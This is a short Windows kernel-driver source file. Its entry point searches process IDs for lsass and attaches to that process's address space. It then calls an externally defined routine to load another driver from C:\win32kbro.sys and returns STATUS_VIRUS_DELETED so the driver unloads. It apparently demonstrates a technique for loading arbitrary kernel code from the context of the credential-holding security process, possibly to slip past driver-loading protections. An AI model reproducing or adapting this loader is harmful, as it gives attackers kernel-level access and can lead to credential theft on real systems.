#include "Common.h"

EXTERN_C
PCCHAR
NTAPI
PsGetProcessImageFileName(IN PEPROCESS Process);

__declspec(
    noinline) long CallMeWin32kDriver(wchar_t *DriverPath, unsigned long DriverPathLength, bool NeedPrefix = true);

EXTERN_C
NTSTATUS
DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
    dprintf("new world!\n");

    PEPROCESS pEpLsass = nullptr;
    for (ULONG i = 0; i < 0x5000; i += 4)
    {
        PEPROCESS pEp = nullptr;
        auto lStatus = PsLookupProcessByProcessId((HANDLE)i, &pEp);
        if (!NT_SUCCESS(lStatus) || !pEp)
        {
            continue;
        }

        auto pName = PsGetProcessImageFileName(pEp);
        // A more casual code
        if (pName && strstr(pName, "lsass"))
        {
            pEpLsass = pEp;
        }
        ObDereferenceObject(pEp);

        if (pEpLsass)
        {
            break;
        }
    }

    if (pEpLsass)
    {
        KAPC_STATE ks;
        KeStackAttachProcess(pEpLsass, &ks);
        CallMeWin32kDriver(L"C:\\win32kbro.sys", wcslen(L"C:\\win32kbro.sys") * 2);
        KeUnstackDetachProcess(&ks);
    }

    return STATUS_VIRUS_DELETED;
}
